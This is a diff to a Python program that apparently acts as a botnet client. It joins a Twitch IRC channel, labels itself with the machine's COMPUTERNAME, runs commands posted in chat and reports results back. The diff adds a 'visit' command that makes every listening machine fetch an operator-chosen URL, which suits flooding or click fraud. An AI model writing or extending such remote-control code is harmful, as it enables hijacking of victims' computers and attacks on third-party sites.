@@ -8,7 +8,7 @@ HOST = "irc.twitch.tv"
 PORT = 6667
 NICK = "username"
 PASS = "oauth:"
-CHAN = "#evnl_"
+CHAN = "#channel"
 RATE = (20 / 30)
 CHAT_MSG = re.compile(r"^:\w+!\w+@\w+\.tmi\.twitch\.tv PRIVMSG #\w+ :")
 clientName = os.environ['COMPUTERNAME']
@@ -54,11 +54,15 @@ def main():
                             chat(s, clientName + " completed the command.")
                         except Exception as e:
                             chat(s, clientName + " encountered an error. " + str(e))
+                    elif messageArray[2] == 'visit':
+                        try:
+                            visit = urllib.request.urlopen(messageArray[3])
+                            chat(s, clientName + " completed the command with code " + str(visit.getCode()))
+                        except Exception as e:
+                            chat(s, clientName + " encountered an error. " + str(e))
                     else:
                         chat(s, "Incorrect command usage.")
-
         sleep(1)
-
 
 def chat(sock, msg):
     sock.send("PRIVMSG {} :{}".format(CHAN, msg+"\r\n").encode())
